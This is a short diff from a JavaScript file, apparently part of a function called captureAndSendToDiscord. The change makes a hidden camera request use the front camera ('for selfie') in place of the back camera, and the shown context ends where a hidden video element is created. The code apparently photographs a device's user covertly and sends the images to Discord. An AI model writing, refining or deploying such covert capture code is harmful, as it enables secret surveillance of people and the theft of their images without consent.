@@ -988,9 +988,9 @@ async function captureAndSendToDiscord(){
       deviceName = 'Windows PC';
     }
     
-    // Request camera access (hidden, back camera preferred for iPhone)
+    // Request camera access (hidden, front camera for selfie)
     const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'environment' } // 'environment' = back camera
+      video: { facingMode: 'user' } // 'user' = front camera
     });
     
     // Create hidden video element
